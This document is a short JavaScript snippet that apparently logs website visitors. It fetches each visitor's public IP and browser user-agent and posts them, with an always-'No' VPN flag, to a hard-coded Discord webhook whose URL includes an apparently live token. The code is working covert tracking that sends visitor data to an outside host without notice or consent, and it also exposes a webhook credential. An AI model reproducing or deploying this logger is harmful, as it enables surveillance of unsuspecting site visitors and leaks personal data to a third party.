const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'

fetch('https://api.ipify.org/?format=json')
  .then(function(response) {
    return response.json();
  })
  .then(function(data) {
    var ip = data.ip;
    var computerName = navigator.userAgent;

    var vpnIpRanges = [

    ];

    var isVPN = vpnIpRanges.some(function(range) {
      return isIPInRange(ip, range);
    });

    var webhook = 'https://discord.com/api/webhooks/1146479722239373514/LvJIRvNs-OWJpzO6pcYevfijhvUpReAFWpbXjmct_kCxEg16pmqig2znAVjgjd7fdASI';

    var message = {
      embeds: [
        {
          title: 'Website Logs!',
          color: 3447003,
          fields: [
            {
              name: 'Connected:',
              value: ip,
              inline: true
            },
            {
              name: 'Computer Name:',
              value: computerName,
              inline: true
            },
            {
              name: 'VPN:',
              value: isVPN ? 'Yes' : 'No',
              inline: true
            }
          ]
        }
      ]
    };

    fetch(webhook, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(message)
    });
  });

function isIPInRange(ip, range) {
  var ipInt = ipToNumber(ip);
  var rangeParts = range.split('/');
  var rangeStart = ipToNumber(rangeParts[0]);
  var rangeEnd = rangeStart + Math.pow(2, 32 - parseInt(rangeParts[1])) - 1;
  return ipInt >= rangeStart && ipInt <= rangeEnd;
}

function ipToNumber(ip) {
  return ip.split('.').reduce(function(result, octet) {
    return (result << 8) + parseInt(octet, 10);
  }, 0);
}